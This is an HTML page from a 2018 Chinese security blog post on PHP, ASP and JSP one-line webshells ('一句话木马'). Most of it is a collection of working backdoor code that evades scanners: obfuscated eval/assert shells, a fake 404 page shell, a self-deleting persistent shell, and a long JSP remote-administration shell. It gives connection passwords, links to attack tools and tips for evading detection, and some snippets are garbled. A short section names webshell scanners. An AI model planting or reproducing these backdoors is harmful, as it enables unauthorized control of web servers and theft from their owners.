@@ -1,0 +1,894 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+    
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="一句话木马, wh1te">
+    <meta name="description" content="About WebShell
+
+
+
+WebShell关于webshell在这里做一个简单的讲解，就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。通过这个后门，可以使用特定工具(比如：">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>一句话木马 | wh1te</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+</head>
+
+</head>
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">wh1te</span>
+                    </a>
+                </div>
+                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wh1te</div>
+        <div class="logo-desc">
+            
+            不忘初心，方得始终
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link"><a href="https://github.com/lddp" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:1061722245@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1061722245" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        一句话木马
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1,
+    #articleContent h2,
+    #articleContent h3,
+    #articleContent h4,
+    #articleContent h5,
+    #articleContent h6 {
+        padding-top: 76px;
+        margin-top: -76px;
+    }
+
+    #articleContent h1 {
+        line-height: 3.5rem;
+    }
+
+    #articleContent h2 {
+        line-height: 3.2rem;
+    }
+
+    #articleContent h3 {
+        line-height: 2.8rem;
+    }
+
+    #articleContent h4 {
+        line-height: 2.5rem;
+    }
+
+    #articleContent h5 {
+        line-height: 2.2rem;
+    }
+
+    #articleContent h6 {
+        line-height: 1.9rem;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            
+            <div class="article-tag">
+                
+                <a href="/tags/Note/" target="_blank">
+                    <span class="chip bg-color">Note</span>
+                </a>
+                
+            </div>
+            
+            <div class="post-info">
+                
+                <span class="post-cate">
+                    <i class="fa fa-bookmark fa-fw icon-category"></i>
+                    
+                    <a href="/categories/Skill/" class="post-category" target="_blank">
+                        Skill
+                    </a>
+                    
+                </span>
+                
+
+                <span class="post-date">
+                    <i class="fa fa-clock-o fa-fw"></i>2018-07-23
+                </span>
+            </div>
+        </div>
+        <hr>
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>About WebShell</p>
+<a id="more"></a>
+
+<hr>
+<h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p>关于webshell在这里做一个简单的讲解，就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。通过这个后门，可以使用特定工具(比如：菜刀)连接，然后执行各种命令以及查看网站的各类信息。我主修php(虽然学的不咋地),所以写php的较多，毕竟php是世界上最美的语言嘛～～～</p>
+<h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p>webshell的本质，其实就是利用了脚本语言(php,asp,jsp等)的特定函数(代码执行函数，系统命令执行函数)，通过向这些函数传递参数，就可以实现对网站的操作，即所谓的getshell。<br>例如：</p>
+<pre><code>&lt;?php @eval($_POST[&#39;aa&#39;]);?&gt;</code></pre><p>php的eval函数，执行代码，典型的一句话木马。</p>
+<h4 id="0x02-WebShell-demo"><a href="#0x02-WebShell-demo" class="headerlink" title="0x02 WebShell demo"></a>0x02 WebShell demo</h4><ul>
+<li>php：</li>
+</ul>
+<ol>
+<li>最基础的<pre><code class="php">&lt;?php @eval($_POST[&#39;aa&#39;])?&gt;</code></pre>
+菜刀连接：<a href="http://www.xxxx.com/1.php" target="_blank" rel="noopener">http://www.xxxx.com/1.php</a><br>密码：aa</li>
+<li>进阶版<pre><code class="php">&lt;?php 
+ $POST[&#39;POST&#39;]=&#39;assert&#39;;
+ $array[]=$POST;
+ $array[0][&#39;POST&#39;]($_POST[&#39;aa&#39;]);
+?&gt;</code></pre>
+菜刀连接：<a href="http://www.xxxx.com/2.php" target="_blank" rel="noopener">http://www.xxxx.com/2.php</a><br>密码：aa</li>
+<li>去掉敏感函数(避免webshell查杀)<pre><code class="php">&lt;?php ($_=@$_GET[2]).@$_($_POST[&#39;aa&#39;])?&gt;</code></pre>
+菜刀连接：<a href="http://www.xxxx.com/3.php?2=assert" target="_blank" rel="noopener">http://www.xxxx.com/3.php?2=assert</a><br>密码：aa</li>
+<li>避开关键字<pre><code class="php">&lt;?php  
+($rcoil = $_POST[&#39;rcoil&#39;]) &amp;&amp; @preg_replace(&#39;/ad/e&#39;,&#39;@&#39;.str_rot13(&#39;riny&#39;).&#39;($rcoil)&#39;, &#39;add&#39;);
+?&gt;</code></pre>
+菜刀连接：<a href="http://www.xxxx.com/4.php" target="_blank" rel="noopener">http://www.xxxx.com/4.php</a><br>密码：rocil</li>
+<li>把eval封装在函数里，避开狗的查杀<pre><code class="php">&lt;?php
+funktion 我是函数（）{
+ $a=&#39;eval&#39;;
+ return $a;
+}  
+$b=我是函数();
+$b($_POST(&#39;aa&#39;));
+?&gt;</code></pre>
+函数名称可以自定义，无所谓的，这样可以过狗(下个小节解释何为过狗)</li>
+</ol>
+<p>菜刀连接：<a href="http://www.xxxx.com/5.php" target="_blank" rel="noopener">http://www.xxxx.com/5.php</a><br>密码：aa</p>
+<ol start="6">
+<li>变量覆盖<pre><code class="php">&lt;?php foreach(array(&#39;_POST&#39;) as $_r){foreach($$_r as $_k =&gt; $_v) {$$_k = $_v;}};assert($a);?&gt;</code></pre>
+变量覆盖，$$a</li>
+</ol>
+<p>菜刀连接：<a href="http://www.xxxx.com/6.php" target="_blank" rel="noopener">http://www.xxxx.com/6.php</a><br>密码：a<br>7.回调函数</p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+    $e=$_REQUEST[&#39;e&#39;];
+    $arr=array($_POST[&#39;aa&#39;],);
+    array_filter($arr,base64_decode($e));
+?&gt;</code></pre>
+<p>菜刀连接：<a href="http://www.xxxx.com/7.php?e=YXNzZXJ0" target="_blank" rel="noopener">http://www.xxxx.com/7.php?e=YXNzZXJ0</a><br>密码：aa</p>
+<p>这是大佬的解析：<a href="https://www.codetd.com/article/115647" target="_blank" rel="noopener">回调后门</a></p>
+<ol start="8">
+<li>骚操作，避开关键字<pre><code class="php">&lt;?php @$_++;$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);@${$__}[!$_](${$__}[$_]);?&gt;</code></pre>
+访问：<a href="http://www.xxxx.com/8.php" target="_blank" rel="noopener">http://www.xxxx.com/8.php</a><br>post数据：0=assert&amp;1=phpinfo();</li>
+</ol>
+<p>菜刀连接：<a href="http://www.xxxx.com/8.php" target="_blank" rel="noopener">http://www.xxxx.com/8.php</a><br>密码:1</p>
+<pre><code class="php">&lt;?php   
+$_=&quot;&quot;;   
+$_[+&quot;&quot;]=&#39;&#39;;   
+$_=&quot;$_&quot;.&quot;&quot;;   
+$_=($_[+&quot;&quot;]|&quot;&quot;).($_[+&quot;&quot;]|&quot;&quot;).($_[+&quot;&quot;]^&quot;&quot;);   
+?&gt;   </code></pre>
+<p>菜刀连接：<a href="http://www.xxxx.com/8.php?_=assert&amp;__=eval($_POST[&#39;pass&#39;])" target="_blank" rel="noopener">http://www.xxxx.com/8.php?_=assert&amp;__=eval($_POST[&#39;pass&#39;])</a><br>密码：pass</p>
+<ol start="9">
+<li>避开&lt;?php</li>
+</ol>
+<pre><code class="php">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; </code></pre>
+<p>菜刀连接：<a href="http://www.xxxx.com/9.php" target="_blank" rel="noopener">http://www.xxxx.com/9.php</a><br>密码：sb</p>
+<ol start="10">
+<li>404马</li>
+</ol>
+<pre><code class="php">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;
+&lt;?php
+@preg_replace(&quot;/[pageerror]/e&quot;,$_POST[&#39;error&#39;],&quot;saft&quot;);
+header(&#39;HTTP/1.1 404 Not Found&#39;);
+?&gt;</code></pre>
+<p>菜刀连接：<a href="http://www.xxxx.com/404.php" target="_blank" rel="noopener">http://www.xxxx.com/404.php</a><br>密码：error</p>
+<ol start="11">
+<li>内存马</li>
+</ol>
+<pre><code class="php">&lt;?php
+ignore_user_abort(true);
+ini_set(&#39;maxdb_execution_time&#39;, 0);
+while (true) {
+    if(!file_exists(&#39;demo.php&#39;)){
+        $a=&quot;&lt;?php @eval(&quot;.&quot;$&quot;.&quot;_POST&quot;.&quot;[tese])?&gt;&quot;;
+        file_put_contents(&#39;demo.php&#39;,$a);
+        file_put_contents(&#39;demo&#39;, base64_decode());
+    }
+}
+?&gt;</code></pre>
+<p>上传这个php文件，访问/demo.php</p>
+<p>菜刀连接：<a href="http://www.xxxx.com/demo.php" target="_blank" rel="noopener">http://www.xxxx.com/demo.php</a><br>密码：tase</p>
+<ol start="12">
+<li>linux截断马</li>
+</ol>
+<pre><code class="php">&lt;?php
+$webpath = dirname(__FILE__).&quot;/&quot;;
+$a=&quot;&lt;?php @eval(&quot;.&quot;$&quot;.&quot;_POST&quot;.&quot;[rcoil]);?&gt;&quot;;
+file_put_contents($webpath .&quot;test.jpg&quot;.chr(9).&quot;.php&quot;, $a);
+?&gt;  //test.jpg%09.php</code></pre>
+<p>上传这个文件，访问/test.jpg%09.php<br>菜刀连接：<a href="http://www.xxxx.com/test.jpg%09.php" target="_blank" rel="noopener">http://www.xxxx.com/test.jpg%09.php</a><br>密码：rocil</p>
+<ol start="13">
+<li>不死马(这个才是最骚的)</li>
+</ol>
+<pre><code class="php">&lt;?php
+@unlink($_SERVER[&#39;SCRIPT_FILENAME&#39;]); //删除自身
+error_reporting(0); //禁用错误报告
+ignore_user_abort(true); //忽略与用户的断开，用户浏览器断开后继续执行
+set_time_limit(0); //执行不超时
+
+$js = &#39;unlock.txt&#39;; //用来判断是否终止执行锁定（解锁）的文件标记
+$mb = &#39;error_reporting.php&#39;; //要锁定的文件路径
+$rn = &#39;error_reporting.txt&#39;; //要锁定的内容
+$nr = file_get_contents($rn); //从文件中读取要锁定的内容
+@unlink($rn); //删除“要锁定的文件内容”，不留痕迹
+
+//创建一个后台执行的死循环
+while (1==1) {
+    //先判断是否需要解除锁定，防止后台死循环造成各种冲突
+    if (file_exists($js)) {
+        @unlink($js); //删除解锁文件
+        exit(); //终止程序
+    }
+    else {
+        @unlink($mb); //先删除目标文件
+        chmod($mb, 0777);  //设置属性
+        @unlink($mb); //先删除目标文件
+        file_put_contents($mb, $nr); //锁定内容 //$fk = fopen($mb, w); fwrite($fk, $nr); fclose($fk);
+        chmod($mb, 0444);  //设置属性
+        usleep(1000000); //等待1秒
+    }
+};
+?&gt;</code></pre>
+<p>这个，有待开发……</p>
+<p>一般不死马多用于CTF线下攻防赛，有大佬已经写好了利用脚本：<br><a href="https://github.com/Ares-X/AWD-Predator-Framework" target="_blank" rel="noopener">AWD攻防赛webshell批量利用框架</a></p>
+<ul>
+<li>asp：</li>
+</ul>
+<ol>
+<li>最基础的<pre><code class="php">&lt;%eval request(&quot;aa&quot;)%&gt;</code></pre>
+菜刀连接：<a href="http://www.xxxx.com/1.asp" target="_blank" rel="noopener">http://www.xxxx.com/1.asp</a><br>密码：aa</li>
+<li>进阶版<pre><code class="php">&lt;% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %&gt;</code></pre>
+菜刀连接：<a href="http://www.xxxx.com/2.asp?a=)0" target="_blank" rel="noopener">http://www.xxxx.com/2.asp?a=)0</a>(tseuqer%20lave<br>密码：0</li>
+</ol>
+<ul>
+<li>jsp：<br>讲真，jsp的马我没怎么用过，大致粘贴上吧，博客最后附带上各位大佬的总结以及webshell的资源</li>
+</ul>
+<ol>
+<li><pre><code>&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;&lt;%!String Pwd=&quot;rcoil&quot;;String EC(String s,String c)throws Exception{return s;}Connection GC(String s)throws Exception{String[]x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2){c.setCatalog(x[2].trim())}return c}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n)}os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close()}void GG(String s,String d)throws Exception{String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i&quot;+&quot;|&quot;);if(Z.equals(&quot;A&quot;)){String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;)){AA(sb)}}else if(Z.equals(&quot;B&quot;)){BB(z1,sb)}else if(Z.equals(&quot;C&quot;)){String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;)}br.close()}else if(Z.equals(&quot;D&quot;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;)}else if(Z.equals(&quot;E&quot;)){EE(z1);sb.append(&quot;1&quot;)}else if(Z.equals(&quot;F&quot;)){FF(z1,response)}else if(Z.equals(&quot;G&quot;)){GG(z1,z2);sb.append(&quot;1&quot;)}else if(Z.equals(&quot;H&quot;)){HH(z1,z2);sb.append(&quot;1&quot;)}else if(Z.equals(&quot;I&quot;)){II(z1,z2);sb.append(&quot;1&quot;)}else if(Z.equals(&quot;J&quot;)){JJ(z1);sb.append(&quot;1&quot;)}else if(Z.equals(&quot;K&quot;)){KK(z1,z2);sb.append(&quot;1&quot;)}else if(Z.equals(&quot;L&quot;)){LL(z1,z2);sb.append(&quot;1&quot;)}else if(Z.equals(&quot;M&quot;)){String[]c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb)}else if(Z.equals(&quot;N&quot;)){NN(z1,sb)}else if(Z.equals(&quot;O&quot;)){OO(z1,sb)}else if(Z.equals(&quot;P&quot;)){PP(z1,sb)}else if(Z.equals(&quot;Q&quot;)){QQ(cs,z1,z2,sb)}}catch(Exception e){sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString())}sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());%&gt;
+</code></pre></li>
+</ol>
+<p>```
+说实话，我还没有参透怎么用。</p>
+<h4 id="0x03-过狗"><a href="#0x03-过狗" class="headerlink" title="0x03 过狗"></a>0x03 过狗</h4><p>在安全里面，狗通常指的都是安全狗，是一款服务器安全防护软件，现在基本上都指那些带有过滤或者有防火墙的服务器。所谓过狗，就是绕过那些安全协议或者是过滤规则，使木马生效。一般查杀webshell，一般就是检测shell的内容，是否有代码执行函数或者是存在命令执行，都有一些特定的规则，针对常见的webshell都可以有效的防范，比如上个小节的第一个php一句话木马，会直接检测出来。当然，后续的衍生版本，几乎很难被检测，这就是所谓的过狗一句话。</p>
+<p>上面的demo后面几个基本上都有过狗的功能，主要还是看网站的狗是不是好狗了。</p>
+<h4 id="0x04-利用"><a href="#0x04-利用" class="headerlink" title="0x04 利用"></a>0x04 利用</h4><p>一般一句话木马的利用方式都是用菜刀进行连接，中国菜刀的使用方法这里就不做赘述了，我放上几个版本的菜刀链接(如果有360或者是类似的安全软件，会报有毒，其实没啥事儿)</p>
+<p><a href="http://p726yrsf9.bkt.clouddn.com/%E8%8F%9C%E5%88%80%281%29.zip" target="_blank" rel="noopener">中国菜刀</a></p>
+<p>另外就是已经停更的中国蚁剑，类似于菜刀，也很方便。</p>
+<p><a href="https://github.com/antoor/antSword" target="_blank" rel="noopener">中国蚁剑</a></p>
+<p>木马上传成功，可以使用工具连接，那么基本上就可以操作整个网站了，至于服务器，就看自己的本事了。</p>
+<h4 id="0x04-查杀"><a href="#0x04-查杀" class="headerlink" title="0x04 查杀"></a>0x04 查杀</h4><p>通常都会利用现成的工具或者是脚本对整站进行查杀，以免漏网之鱼的出现。</p>
+<p>Linux下webshell查杀工具：<a href="https://github.com/search?q=webs+hell" target="_blank" rel="noopener">MaskFindShell</a></p>
+<p>Windows下webshell查杀工具：<a href="http://www.d99net.net/" target="_blank" rel="noopener">D盾</a></p>
+<p>在线查杀webshell：<a href="https://scanner.baidu.com/#/pages/intro" target="_blank" rel="noopener">WEBDIR</a>（这个我没有用过，反正你看着办吧）</p>
+<h4 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h4><p>一句话木马，很强大也很好用，本篇只用作教学，其他非法用途与本文无关，请勿用于非法用途，否则后果自负。</p>
+<p>一句话木马通常要面临的问题就是免杀，无非就是混淆扫描器视听：</p>
+<ol>
+<li>在固定区域生成随机名称变量,后借助str_replace拼合base64_decode,执行命令的过程</li>
+<li>修改文件时间</li>
+<li>改名融入上传后所在文件夹，让人无法直观看出文件异常</li>
+<li>文件大小的伪装处理(至少看起大小像个正常脚本)</li>
+<li>选好藏身路径并尽量少的访问</li>
+<li>畸形目录%20</li>
+</ol>
+<p>除这些需要辅助工具进行连接的一句话木马外，也有各类脚本语言的大马，直接在网页进行操作，也是十分方便，由于时间问题，今天只说这些小马。文章末尾会附带webshell合集以及我借鉴的大佬博客，请大家合理使用。</p>
+<p><a href="http://rcoil.me/2016/11/Web%E5%90%8E%E9%97%A8%20%E4%B8%80%E5%8F%A5%E8%AF%9D/" target="_blank" rel="noopener">php一句话木马合集</a><br><a href="https://mp.weixin.qq.com/s/SCk_Q8oG22SaHX3qJ08HeQ" target="_blank" rel="noopener">php一句话后门</a><br><a href="https://www.jianshu.com/p/197ee47ac1a7" target="_blank" rel="noopener">神奇的一句话后门溯源</a><br><a href="https://www.codetd.com/article/115647/" target="_blank" rel="noopener">php回调后门</a><br><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell合集</a></p>
+<hr>
+<p>另：这篇写完已经凌晨3点了，最近身体不适，有不对的地方还望大佬指出，我及时修改，见谅见谅。<br>吐血中……</p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">Reprint please specify: </span>
+                    <a href="http://yoursite.com" class="b-link-green">wh1te</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2018/07/23/一句话木马/" class="b-link-green">一句话木马</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">Previous</div>
+            <div class="card">
+                <a href="/2018/07/24/SQL注入之宽字节注入/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SQL注入之宽字节注入">
+                        
+                        <span class="card-title">SQL注入之宽字节注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">About SQL Injection
+
+
+宽字节注入0x01 前言对于SQL注入，我估计搞安全的都玩的滚瓜烂熟了，搞站什么的都是分分钟来的，但是之前做了一道宽字节注入的题目，又打开了我一扇通往新世界的大门(PS:早都碰到过，只不过一直没有</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-07-24
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Skill/" class="post-category" target="_blank">
+                                    Skill
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Note/" target="_blank">
+                        <span class="chip bg-color">Note</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">Next</div>
+            <div class="card">
+                <a href="/2018/07/19/灾后重建/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="灾后重建">
+                        
+                        <span class="card-title">灾后重建</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">About MySelf
+
+
+说实话，点太背了。
+
+
+电脑前几天出问题了，硬盘坏了，数据清空，我这心里，阴影面积无限大。
+
+
+换了新电脑，emmmm……
+
+
+重整旗鼓，从头开始。</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-07-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Life/" class="post-category" target="_blank">
+                                    Life
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/The-Heart/" target="_blank">
+                        <span class="chip bg-color">The Heart</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title">TOC</div>
+            <div id="toc-content">
+
+            </div>
